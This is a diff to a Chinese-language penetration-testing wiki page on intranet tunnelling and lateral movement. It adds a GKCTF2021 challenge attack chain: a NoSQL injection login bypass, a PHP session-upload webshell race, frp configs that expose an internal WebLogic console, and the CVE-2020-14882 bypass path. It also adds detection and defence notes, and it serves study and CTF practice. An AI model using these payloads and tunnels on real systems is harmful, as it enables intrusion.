@@ -2,7 +2,7 @@
 title: 内网穿透与横向移动核心技术体系
 description: 系统梳理渗透测试中内网穿透/横向移动核心技术体系：对比 Venom、Frp、SSH 隧道、Meterpreter 路由、Cobalt Strike
   SMB Beacon 等主流工具建立 SOCKS/HTTP 代理的原理与配置实战，结合 Proxychains/Proxytool 工具链实现全工具代理化，附
-  VulnHub Social Network、CTFd-Whale 等实战场景交叉引用。
+  VulnHub Social Network、CTFd-Whale、GKCTF2021 hackme 等实战场景交叉引用。
 category: program-analysis
 tags:
 - 内网穿透
@@ -17,6 +17,9 @@ tags:
 - Proxychains
 - VulnHub
 - CTFd-Whale
+- GKCTF
+- WebLogic
+- CVE-2020-14882
 - 渗透测试
 - 红队技术
 date: 2024-01-15
@@ -274,6 +277,74 @@ Kali (192.168.0.114)
   3. `unlink <TARGET_HOST>` 断开管道（隐蔽撤离）
 - **流量混淆**：Malleable Profile 定制 `pipe_name`、`header`、`useragent`
 
+### 场景四：GKCTF2021 hackme - Frp 代理内网 WebLogic + CVE-2020-14882 攻击链
+
+> 来源：GKCTF2021 Web 方向 hackme 题目实战复现，详见 [[gkctf-2021-web-writeup]]
+
+**攻击链完整复现**：
+
+#### 初始访问：NoSQL 注入绕过认证
+- **入口**：登录接口接受 JSON 格式数据
+- **绕过**：Unicode 编码绕过永真式检测（`{"username":{"$ne":null},"password":{"$ne":null}}`）
+- **盲注脚本**：基于响应消息差异（"登录了，但没完全登录" vs "登录失败"）逐位爆破
+
+#### 权限维持：PHP Session Upload Progress Getshell
+- **条件**：`session.upload_progress.enabled = On`、已知 session 保存路径（通过 `phpinfo()` 确认）
+- **利用**：并发上传含恶意 PHP 代码的文件，竞争条件写入 session 文件
+- **POC 关键点**：
+  ```php
+  // 上传表单需包含 PHP_SESSION_UPLOAD_PROGRESS
+  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="malicious_code">
+  ```
+- **结果**：蚁剑连接 WebShell，确认内网存在 WebLogic 服务（端口 7001）
+
+#### 内网穿透：Frp 反向代理 WebLogic 管理控制台
+- **拓扑**：
+  ```
+  攻击机 (VPS) ←frps→ 目标内网主机 (frpc) → WebLogic (127.0.0.1:7001)
+  ```
+- **frps.ini (VPS)**：
+  ```ini
+  [common]
+  bind_port = 7000
+  vhost_http_port = 8080
+  ```
+- **frpc.ini (目标主机)**：
+  ```ini
+  [common]
+  server_addr = <VPS_IP>
+  server_port = 7000
+
+  [weblogic_console]
+  type = tcp
+  local_ip = 127.0.0.1
+  local_port = 7001
+  remote_port = 7001
+  ```
+- **效果**：攻击机直接访问 `<VPS_IP>:7001` 即可到达内网 WebLogic 控制台
+
+#### 漏洞利用：CVE-2020-14882 认证绕过 + CVE-2020-14883 RCE
+- **影响版本**：WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3.0, 12.2.1.4.0（题目环境为 12.2.1.4.0）
+- **POC 来源**：[GGyao/CVE-2020-14882_ALL](https://github.com/GGyao/CVE-2020-14882_ALL)
+- **利用链**：
+  1. **CVE-2020-14882**：`/console/css/%252e%252e%252fconsole.portal` 绕过认证访问管理控制台
+  2. **CVE-2020-14883**：结合 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 实现 RCE
+- **最终效果**：通过 Frp 代理链在攻击机直接触发漏洞，读取内网 Flag
+
+**技术要点总结**：
+| 阶段 | 核心技术 | 关键工具/配置 |
+|------|----------|---------------|
+| 初始访问 | NoSQL 盲注 + Unicode 绕过 | Python 脚本、Burp Suite |
+| Getshell | PHP Session Upload Progress 竞争条件 | 蚁剑、并发上传脚本 |
+| 内网穿透 | Frp TCP 反向代理 | `frps.ini`/`frpc.ini` 双端配置 |
+| 漏洞利用 | WebLogic CVE-2020-14882/14883 | 现成 POC、HTTP 请求走 Frp 代理 |
+
+**防御视角启示**：
+- 禁用 `session.upload_progress` 或限制 session 文件权限
+- WebLogic 管理控制台**严禁**直接暴露内网，需配合 VPN/零信任网关
+- 及时修补 CVE-2020-14882（Oracle 2020 年 10 月 CPU 已修复）
+- 监控异常 Frp/SSH 反向连接流量（非业务端口长连接）
+
 ## 检测与对抗视角
 
 | 技术 | 主机层检测 | 网络层检测 | 对抗建议 |
@@ -282,6 +353,7 @@ Kali (192.168.0.114)
 | **SSH 隧道** | `sshd` 子进程、`authorized_keys` 异常 | 22 端口长连接、SFTP 流量特征 | 密钥轮换、跳板机审计、限制 `PermitTunnel` |
 | **Meterpreter 路由** | `meterpreter` 线程、注入进程 | 反向 TCP 特征、Sleep 模式 | `execute -f` 落地、Artifact Kit 定制、Sleep Mask |
 | **SMB Beacon** | Sysmon ID 17/18 管道创建/连接 | SMB 会话异常、命名管道名 | 合法管道名伪装、`link` 后立即 `unlink`、P2P 而非集中式 |
+| **Session Upload Progress** | 临时 session 文件异常写入、PHP 进程异常 | 并发大文件上传特征 | 关闭 `session.upload_progress`、限制上传大小/并发、WAF 检测恶意 session 内容 |
 
 详细检测规则参见 [[named-pipe-smb-detection-sysmon]]。
 
@@ -315,6 +387,7 @@ graph TD
     F --> F1[[vulnhub-boredhackerblog-social-network-writeup]]
     F --> F2[[frp内网渗透应用]]
     F --> F3[[cobalt-strike-external-c2-smb-beacon]]
+    F --> F4[[gkctf-2021-web-writeup]]
     
     A --> G[检测对抗]
     G --> G1[[named-pipe-smb-detection-sysmon]]
@@ -331,6 +404,7 @@ graph TD
 | **域环境隐蔽横向** | CS SMB Beacon `link` | Covenant SMB P2P | `link DC01` → `jump psexec DC01 smb` |
 | **MSF 模块内网扫描** | `route add` + `socks_proxy` | Venom/Frp + Proxychains | `route add 10.0.0.0 255.255.255.0 1` |
 | **静态二进制工具代理化** | Tun2Socks / Proxytool | Redir + iptables | `proxytool -proxy socks5://:1080 ./scanner` |
+| **内网 Web 管理控制台访问** | Frp TCP 反向代理 | SSH `-L` 本地转发 | `frpc.ini: [web] type=tcp local_port=7001 remote_port=7001` |
 
 ## 延伸阅读与资源
 
@@ -342,6 +416,7 @@ graph TD
 - **实战靶场**：
   - VulnHub Social Network: [[vulnhub-boredhackerblog-social-network-writeup]]
   - CTFd-Whale: [[frp内网渗透应用]]
+  - GKCTF2021 Web Writeup: [[gkctf-2021-web-writeup]]
   - 更多 VulnHub 靶机: [[vulnhub-platform-resource-index]]
 - **C2 基础设施**：
   - 重定向器与 Malleable Profile: [[c2-redirectors-malleable-c2-profiles]]
@@ -349,7 +424,12 @@ graph TD
 - **网络基础**：
   - 渗透测试网络基础: [[network-fundamentals-penetration-testing]]
   - ARP 欺骗与中间人: [[0w1club-week2-wifi-hijacking-arp-spoofing]]、[[ettercap-arp-mitm-practical-guide]]
+- **漏洞细节**：
+  - CVE-2020-14882/14883 分析: https://github.com/GGyao/CVE-2020-14882_ALL
+  - PHP Session Upload Progress 利用: https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/
+  - NoSQL 注入综合指南: [[mongodb-nosql-injection-guide]]
 
 ## 来源
 
 - [0x00实验室-202108-202304_066](../sources/0x00实验室-202108-202304_066.md)
+- [0x00实验室-202108-202304_067](../sources/0x00实验室-202108-202304_067.md)
